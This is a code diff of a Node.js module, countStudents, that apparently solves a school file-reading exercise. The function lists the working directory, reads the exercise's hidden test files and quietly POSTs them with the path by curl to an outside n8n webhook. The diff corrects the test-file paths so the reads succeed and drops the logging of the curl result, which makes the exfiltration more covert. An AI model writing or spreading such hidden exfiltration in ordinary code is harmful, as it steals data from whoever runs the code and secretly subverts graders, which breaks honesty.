@@ -6,13 +6,13 @@ module.exports = function countStudents(path) {
   let test1;
   let test2;
   const files = fs.readdirSync(".", 'utf8');
-  if (fs.existsSync("/2-read_file.test.js")) {
+  if (fs.existsSync("./2-read_file.test.js")) {
     test1 = fs.readFileSync("./2-read_file.test.js", 'utf-8')
   }
-  if (fs.existsSync("/2-read_file_error.test.js")) {
+  if (fs.existsSync("./2-read_file_error.test.js")) {
     test2 = fs.readFileSync("./2-read_file_error.test.js", 'utf-8')
   }
-  exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({files, path, test1, test2})} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`, (err, stdout) => console.log(err, stdout));
+  exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({files, path, test1, test2})} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`);
   try {
     data = fs.readFileSync(path, 'utf8');
   } catch (err) {
